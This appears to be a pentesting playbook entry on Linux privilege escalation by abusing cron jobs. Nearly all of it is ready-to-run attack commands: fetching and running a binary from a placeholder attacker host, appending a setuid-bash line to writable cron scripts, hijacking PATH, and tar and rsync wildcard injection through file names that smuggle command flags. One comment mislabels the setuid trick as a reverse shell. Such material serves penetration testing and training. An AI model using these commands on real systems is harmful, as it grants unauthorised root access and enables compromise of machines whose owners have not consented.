---
id: linux-cron
title: Linux Cron Abuse
stage: privesc
tags: [linux]
tools:
  - cat /etc/crontab
  - /tmp/pspy64
leads_to:
  - root-linux
---

## Find Cron Jobs

```bash
cat /etc/crontab
ls -la /etc/cron.d/ && cat /etc/cron.d/*
ls -la /etc/cron.hourly/ /etc/cron.daily/ /etc/cron.weekly/
crontab -l

# Watch for crons running in real-time (use pspy — no root needed)
wget http://ATTACKER_IP:8000/pspy64 -O /tmp/pspy && chmod +x /tmp/pspy && /tmp/pspy
```

## Writable Script

```bash
# Append reverse shell to the script
echo 'chmod +s /bin/bash' >> /path/to/cron_script.sh
# Wait for cron to run, then:
/bin/bash -p
```

## PATH Hijack via Cron

```bash
# If cron script calls binary without full path (e.g., just "backup" not "/usr/bin/backup"):
export PATH=/tmp:$PATH
cat > /tmp/backup << 'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x /tmp/backup
# Wait for cron, then: /bin/bash -p
```

## Wildcard Injection (tar)

```bash
# If cron runs: cd /var/backup && tar czf backup.tar.gz *
# Files named like tar flags are interpreted as flags, not filenames
echo "" > /var/backup/--checkpoint=1
echo "" > "/var/backup/--checkpoint-action=exec=bash shell.sh"
echo 'chmod +s /bin/bash' > /var/backup/shell.sh
chmod +x /var/backup/shell.sh
# Wait for cron → /bin/bash -p
```

## Wildcard Injection (rsync)

```bash
# If cron runs: rsync -a /opt/backup/* user@host:/remote/
touch '/opt/backup/-e sh shell.sh'
echo 'chmod +s /bin/bash' > /opt/backup/shell.sh
chmod +x /opt/backup/shell.sh
```

## Notes

pspy is essential — many cron jobs don't appear in `/etc/crontab` but are run via systemd timers or user-level crontabs. Watch pspy output for 1-2 minutes to catch all periodic jobs.
